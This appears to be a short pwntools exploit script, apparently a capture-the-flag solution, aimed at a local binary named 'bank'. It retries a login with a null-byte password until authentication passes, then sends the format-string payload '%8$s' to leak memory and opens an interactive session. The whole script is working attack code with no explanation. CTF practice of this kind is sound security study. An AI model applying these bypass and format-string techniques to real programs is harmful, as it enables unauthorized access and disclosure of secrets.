from pwn import*
context.log_level='debug'
while True:
	r = process('./bank')
	try:
		r.sendlineafter('account:','halo')
		r.sendlineafter('password:','\x00')
		r.recvuntil('Do you want to check your account balance?')
		r.sendline('yes')
		break
	except:
		r.close()
		continue
r.sendlineafter('Please input your private code: ','%8$s')

r.interactive()
